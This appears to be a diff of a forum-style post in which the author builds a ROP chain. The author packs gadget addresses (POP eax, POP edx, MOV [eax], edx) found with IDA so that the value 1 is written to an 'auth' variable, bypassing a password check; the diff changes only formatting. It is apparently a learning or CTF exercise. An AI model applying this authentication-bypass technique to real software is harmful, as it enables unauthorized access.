@@ -3,14 +3,19 @@ I looked for the addresses of auth and ra of check password using IDA, for auth 
 then, I wanted to put my shellcode in : 
     
     equals : MOV eax, auth_address
+    ##########################################
     POP_eax = struct.pack('<I', search.find('POP eax'))
     auth_address = struct.pack('<I', addresses.AUTH)
-    
+
+
     equals : MOV edx, 0x1
+    ##########################################
     POP_edx = struct.pack('<I', search.find('POP edx'))
     one_value = struct.pack('<I', 0x00000001)
-    
-    equals : MOV [eax], edx   
+
+
+    equals : MOV [eax], edx
+    ##########################################
     MOV = struct.pack('<I', search.find('MOV [eax], edx'))
     
     
